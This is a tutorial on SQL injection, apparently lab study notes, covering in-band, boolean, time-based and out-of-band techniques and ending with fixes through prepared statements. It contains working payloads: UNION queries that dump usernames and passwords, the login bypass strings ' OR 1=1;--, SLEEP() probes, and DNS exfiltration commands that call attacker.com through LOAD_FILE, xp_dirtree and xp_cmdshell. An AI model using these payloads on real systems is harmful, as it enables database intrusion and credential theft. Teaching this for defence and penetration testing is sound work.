# 📌 SQL Injection Introduction

## SQL Essentials for Injection

### SQL Comments

--

#

/\* \*/

### UNION

`SELECT name, age FROM students UNION SELECT username, id FROM admins;`

### LIKE and Wildcards

`SELECT * FROM users WHERE username LIKE 'adm%';`

### LIMIT

```bash
SELECT * FROM users LIMIT 1;       -- returns only the first row
SELECT * FROM users LIMIT 2, 1;    -- skips 2 rows, returns the 3rd
```

### String Functions

Two functions are especially useful when extracting data through injection:

- group_concat() aggregates values from multiple rows into a single comma-separated string. Instead of getting results row by row, you get everything at once:

```bash
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
-- Returns: admin:pass123<br>martin:secret<br>jim:work456
```

- CONCAT() joins individual values together: CONCAT(username, ':', password) produces admin:pass123 for a single row.

### The information_schema Database

Every MySQL, MariaDB, and PostgreSQL server has a built-in database called `information_schema`. It contains metadata about every other database on the server: database names, table names, column names, and data types. Think of it as the database's map of itself.

Two tables within information_schema are particularly valuable during SQL Injection:

- `information_schema.tables`: lists every table. The table_schema column holds the database name, and table_name holds the table name.
- `information_schema.columns`: lists every column. The table_name and column_name columns let you discover the structure of any table.

## What is SQL Injection?

### Three Types of SQL Injection

SQL Injection techniques are categorised based on how the attacker receives feedback from the database:

In-Band SQL Injection is when the results of the injection are returned directly in the web application's response. This is the most straightforward type. It has two subtypes:

- Error-Based: The database returns error messages that reveal information about its structure.
- Union-Based: The attacker uses UNION to append a second query and extract data through the page output.

Blind SQL Injection is when the application does not display query results or error messages. The attacker must infer information from indirect signals:

- Authentication Bypass: The login succeeds or fails based on the injected query.
- Boolean-Based: The application's response changes subtly (e.g., different content, true/false) based on whether a condition is true.
  Time-Based: The attacker uses SLEEP() to introduce a time delay and observes whether the response is slow (true) or fast (false).

Out-of-Band SQL Injection is when the attacker causes the database server to make an external network request (e.g., a DNS lookup) that exfiltrates data through a separate channel. This is used when neither in-band nor blind techniques are viable.

### Detecting SQL Injection

The simplest detection method is to inject test characters and observe the response:

- Enter a single quote ': if the application returns a database error, the input is likely being inserted into a SQL query without proper handling.
- Try " (double quote): some queries use double quotes instead of single quotes.
- Enter ;--: if the application behaves differently (e.g., returns different content), the comment syntax is being processed.
- Test OR 1=1: if it changes the results, the input is directly in the query's logic.

## In-Band SQL Injection

In-Band SQL Injection is the most common and easiest-to-exploit category. The term "In-Band" means the same communication channel used to deliver the injection is also used to receive the results. You inject through a web request and see the extracted data right there in the page response.

### Error-Based SQL Injection

For example, injecting a single quote ' into a vulnerable parameter might produce an error like:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1`

This tells you several things: the database is MySQL, the input is being wrapped in single quotes, and the application doesn't handle errors gracefully. From here, you can craft more precise payloads to extract information through deliberate error messages.

While Error-Based Injection can reveal structural information, Union-Based Injection is the primary method for extracting large amounts of data.

### Union-Based SQL Injection

Step 1: Determine the number of columns. The UNION operator requires that both queries have the same number of columns. You discover this by injecting UNION SELECT with an incrementing number of values until the error disappears:

```bash
1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns
```

Step 2: Identify which columns are displayed. Not all columns may be rendered on the page. Change the original query's value to something that returns no results (like 0), so only the UNION output is displayed:

`0 UNION SELECT 1,2,3`

The numbers that appear on the page output tell you which column positions you can use for data extraction. If 3 appears in the content area, that is your extraction column.

Step 3: Extract the database name. Replace the visible column position with the database() function:

```bash
0 UNION SELECT 1,2,database()
```

This reveals the current database name — the first piece of the puzzle.

Step 4 — Enumerate tables. Use information_schema.tables to list all tables in the target database:

```bash
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

Step 5: Enumerate columns. Once you've identified an interesting table, get its column names:

```bash
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

Step 6: Extract data. With the table and column names known, extract the actual data:

```bash
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

This returns all usernames and passwords in a readable format.

## Blind SQL Injection: Authentication Bypass

### How Authentication Queries Work

Most login forms work by sending the username and password to the server, which constructs a query like:

`SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;`

The application checks whether this query returns any rows. If it returns a row, the credentials are valid, and you're logged in. If it returns nothing, the login fails. The application never displays the actual query results. It either redirects you to a dashboard or shows "Invalid credentials."

### The Attack

The key insight is that you don't need to know a valid username or password. You just need to make the query return at least one row. Consider what happens if you enter the username ' OR 1=1;-- and anything in the password field. The server constructs:

`SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;`

Let's break down what happens:

- username='': checks for an empty username (no match)
- OR 1=1: this is always true, so the entire WHERE clause becomes true
- ;--: the semicolon ends the statement, and -- comments out everything after it, including the password check
- The database returns every row in the users table
- The application sees that rows were returned and logs you in as the first user (often the admin account)

### Targeting a Specific User

Sometimes you want to log in as a specific account rather than whoever happens to be at the top of the table. If you know the admin's username, you can inject admin'--, which produces:

`SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;`

The password check is completely commented out. The database returns the admin row, and you're logged in as admin without needing the password.

### Variations

The exact payload depends on the query structure. Some things to try:

- ' OR 1=1;-- is classic bypass, works when the username is wrapped in single quotes
- ' OR 1=1# this uses # as the comment character (MySQL alternative)
- " OR 1=1-- for queries that use double quotes around the input
- Try both the username and password fields: some applications only concatenate one of them into the query, so the vulnerable field may vary

### Detection in the Field

When testing a login form during a penetration test, authentication bypass is one of the first things to try. Enter ' OR 1=1;-- in the username field and any string in the password field. If you're logged in, the form is vulnerable to SQL Injection.

In the practical walkthrough task (Task 9), Level 2 presents a login form with a visible SQL Query box showing exactly how your input is inserted into the query. Watch how the username and password fields are placed between single quotes in the WHERE clause.

## Blind SQL Injection and Time-Based

### Boolean-Based Blind SQL Injection

If this input is injectable, the backend query probably looks like:
`SELECT * FROM users WHERE username = '%username%' LIMIT 1;`
By injecting a UNION SELECT with a condition, you can ask the database arbitrary yes/no questions and read the answer from the true/false response.

Step 1: Confirm injection. Inject a condition that is always true:

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--`

The % wildcard matches anything, so this should return true. If you see {"taken":true}, you know injection works.

Step 2: Guess the database name, character by character. Replace the wildcard with specific letters:

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--`

False? Not 'a'. Try b%, c%, keep going. When the response flips to true, you have found the first letter. Then move to the second character: sa%, sb%, sc%, etc. and keep narrowing until you have the full name.

Step 3: Get table and column names. Same technique against information_schema:

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--`

---

## **HIGHLIGHT**

`' UNION SELECT 1,database(),3,4 -- -`
No guessing: Database shown automatically
`' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = database(); -- -`
No guessing: Table Data shown automatically
`' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'; -- -` // where users is the sample table name
`' UNION SELECT 1, username, password, 4 FROM users; -- -`

---

Cycle through characters to find table names, repeat for column names with information_schema.columns, and then do it again for actual data values.

This is slow. Each character takes multiple requests. But it is reliable, and it works even when every other output channel is locked down.

### Time-Based Blind SQL Injection

Time-Based Blind SQLi is for when the application gives you absolutely nothing to work with visually. The page looks identical no matter what you inject. Same content, same status code, same headers. Your only signal is how long the response takes.

MySQL's SLEEP() function pauses query execution for a set number of seconds. Wrap a condition around it, and the database only pauses when the condition is true:

`admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--`

Step 1: Find the column count. Same idea as Union-Based. Try UNION SELECT SLEEP(5) and add columns until you see a delay:

```bash
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

Step 2: Enumerate data. The process is identical to the Boolean-Based one: cycle through characters with LIKE. But instead of checking the page content, you watch the clock. Delay means true. No delay means false.

A word of caution: Network latency can mess with time-based detection. On a flaky connection, a natural lag might look like a successful SLEEP(). Use longer sleep values (5-10 seconds) and test each character a couple of times to be sure. On MSSQL, the equivalent is WAITFOR DELAY '0:0:5'.

When To Use Which

| Scenario                                      | Technique               |
| --------------------------------------------- | ----------------------- |
| App shows different content for true vs false | Boolean-Based           |
| App response looks identical, no matter what  | Time-Based              |
| Time-based is blocked or too unreliable       | Out-of-Band (next task) |

## Out-of-Band SQL Injection

### When You Need Out-Of-Band

OOB comes into play when everything else has failed:

- In-Band is off the table because the app does not show query results or errors.
- Boolean-Based does not work because the response looks the same regardless of the condition.
- Time-Based is unreliable because the network is too noisy, or SLEEP() is blocked.
- But the database server can make outbound connections. That last point is the requirement. If the firewall blocks all outbound - traffic from the DB server, OOB is dead in the water.

You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.

### How It Works

Two channels are involved:

1. The attack channel: your normal web request with the injection payload.
2. The data channel: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

### DNS Exfiltration With MySQL

The most common OOB trick for MySQL uses LOAD_FILE() to trigger a DNS lookup. You embed the data you want as a subdomain:

`SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));`

What happens:

1. (SELECT database()) pulls the database name. Let's say it is webapp_db.
2. CONCAT() builds the string \\webapp_db.attacker.com\share.
3. LOAD_FILE() tries to read that file path. On Windows, this initiates a DNS lookup for webapp_db.attacker.com.
4. Your DNS server catches the request and logs webapp_db. The data is in the subdomain.

### MSSQL Techniques

xp_dirtree triggers a DNS lookup by trying to list a directory on a remote server:

`EXEC master..xp_dirtree '\\attacker.com\share';`

xp_cmdshell (if it is enabled) runs OS commands directly, so you can use nslookup or curl to ship data out:

`EXEC xp_cmdshell 'nslookup data.attacker.com';`

xp_cmdshell is off by default in modern MSSQL, but xp_dirtree is still available and gets used regularly in pentests.

## Remediation and Prevention

### Prepared Statements (Parameterised Queries)

#### Vulnerable PHP code:

```bash
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

User input gets concatenated into the query string. An attacker can escape quotes and inject whatever they want.

Fixed with prepared statements (PDO):

```bash
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

The ? is a placeholder. Whatever the user enters, even ' OR 1=1--, the database treats the whole thing as a literal string. It never touches the query structure.

#### Vulnerable Python code:

query = f"SELECT \* FROM users WHERE username='{username}'"
cursor.execute(query)
Fixed:

cursor.execute("SELECT \* FROM users WHERE username = %s", (username,))
